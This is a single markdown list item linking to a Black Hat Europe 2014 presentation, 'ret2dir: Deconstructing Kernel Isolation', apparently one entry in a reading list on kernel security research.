- [ret2dir: Deconstructing Kernel Isolation](https://www.blackhat.com/docs/eu-14/materials/eu-14-Kemerlis-Ret2dir-Deconstructing-Kernel-Isolation.pdf)